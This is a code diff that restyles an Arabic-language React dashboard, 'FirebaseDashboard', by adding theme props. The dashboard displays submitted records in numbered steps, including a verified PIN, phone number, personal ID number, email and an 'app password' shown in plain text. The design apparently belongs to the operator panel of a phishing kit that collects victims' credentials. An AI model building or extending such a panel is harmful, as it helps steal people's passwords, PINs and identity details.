@@ -935,11 +935,12 @@ export default function FirebaseDashboard() {
 
               {/* Step 5: PIN */}
               {selectedSubmission.step_5_pin && (
-                <DetailSection title="رمز PIN" icon={Shield}>
+                <DetailSection title="رمز PIN" icon={Shield} theme={currentTheme}>
                   <div className="grid grid-cols-2 gap-4">
                     <DetailItem 
                       label="التحقق" 
-                      value={selectedSubmission.step_5_pin.pinVerified ? "تم التحقق بنجاح" : "لم يتم"} 
+                      value={selectedSubmission.step_5_pin.pinVerified ? "تم التحقق بنجاح" : "لم يتم"}
+                      theme={currentTheme}
                     />
                     <div className="bg-orange-900/30 rounded-lg p-3 border border-orange-500/30">
                       <p className="text-xs text-orange-400">رمز PIN</p>
@@ -953,14 +954,14 @@ export default function FirebaseDashboard() {
 
               {/* Step 6: Phone Provider */}
               {selectedSubmission.step_6_phone_provider && (
-                <DetailSection title="مزود خدمة الهاتف" icon={Smartphone}>
+                <DetailSection title="مزود خدمة الهاتف" icon={Smartphone} theme={currentTheme}>
                   <div className="grid grid-cols-2 gap-4">
-                    <DetailItem label="مزود الخدمة" value={selectedSubmission.step_6_phone_provider.provider} />
-                    <DetailItem label="رقم الهاتف" value={selectedSubmission.step_6_phone_provider.phoneNumber} icon={Phone} />
-                    <DetailItem label="الرقم الشخصي" value={selectedSubmission.step_6_phone_provider.personalId} icon={User} />
-                    <DetailItem label="البريد الإلكتروني" value={selectedSubmission.step_6_phone_provider.email} icon={Mail} />
+                    <DetailItem label="مزود الخدمة" value={selectedSubmission.step_6_phone_provider.provider} theme={currentTheme} />
+                    <DetailItem label="رقم الهاتف" value={selectedSubmission.step_6_phone_provider.phoneNumber} icon={Phone} theme={currentTheme} />
+                    <DetailItem label="الرقم الشخصي" value={selectedSubmission.step_6_phone_provider.personalId} icon={User} theme={currentTheme} />
+                    <DetailItem label="البريد الإلكتروني" value={selectedSubmission.step_6_phone_provider.email} icon={Mail} theme={currentTheme} />
                   </div>
-                  <div className="mt-4 pt-4 border-t border-gray-700">
+                  <div className={cn("mt-4 pt-4 border-t", currentTheme.border)}>
                     <div className="bg-red-900/30 rounded-lg p-3 border border-red-500/30">
                       <p className="text-xs text-red-400">كلمة مرور التطبيق</p>
                       <p className="font-mono font-bold text-red-300 mt-1 text-lg">
@@ -972,7 +973,7 @@ export default function FirebaseDashboard() {
               )}
             </div>
           ) : (
-            <div className="flex items-center justify-center h-full text-gray-500">
+            <div className={cn("flex items-center justify-center h-full", currentTheme.textMuted)}>
               <div className="text-center">
                 <FileText className="h-16 w-16 mx-auto mb-4 opacity-50" />
                 <p className="text-xl">اختر تسجيلاً لعرض التفاصيل</p>
